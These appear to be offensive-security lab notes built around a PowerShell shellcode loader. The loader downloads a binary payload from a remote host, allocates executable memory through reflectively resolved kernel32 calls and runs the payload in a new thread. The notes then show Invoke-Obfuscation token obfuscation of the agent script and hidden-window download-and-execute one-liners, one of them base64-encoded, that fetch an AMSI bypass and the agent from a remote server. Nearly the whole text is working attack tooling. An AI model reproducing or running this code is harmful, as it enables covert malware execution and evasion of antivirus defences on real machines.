```powershell
function potatoes {
Param ($cherries, $pineapple)
$tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
$turnips=@()
$tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
}
function apples {
Param (
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
return $type.CreateType()
}

$url = "https://10.10.14.8:8080/http_.bin"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Byte[]] $buf = [System.Net.WebClient]::new().DownloadData($url)

$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
$parsnips =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)
```


Obfuscate with Invoke-Obfuscate
```powershell
Invoke-Obfuscation> SET SCRIPTPATH C:\Payloads\agent.ps1


Successfully set ScriptPath:
C:\Payloads\agent.ps1


Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
<SNIP>

Invoke-Obfuscation> token

<SNIP>
[*] TOKEN\ALL           Select All choices from above (random order)


Invoke-Obfuscation\Token> all


Choose one of the below Token\All options to APPLY to current payload:

[*] TOKEN\ALL\1         Execute ALL Token obfuscation techniques (random order)


Invoke-Obfuscation\Token\All> 1
```


```powershell
powershell.exe -NoP -w hidden -c 'iex(iwr http://192.168.110.51:9091/amsibypass.txt -useb); iex(iwr http://192.168.110.51:9091/agent.ps1 -useb)'

powershell.exe -NoP -w hidden -e aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMQAwAC4ANQAxADoAOQAwADkAMQAvAGEAbQBzAGkAYgB5AHAAYQBzAHMALgB0AHgAdAAgAC0AdQBzAGUAYgApADsAIABpAGUAeAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAxADAALgA1ADEAOgA5ADAAOQAxAC8AYQBnAGUAbgB0AC4AcABzADEAIAAtAHUAcwBlAGIAKQA=


```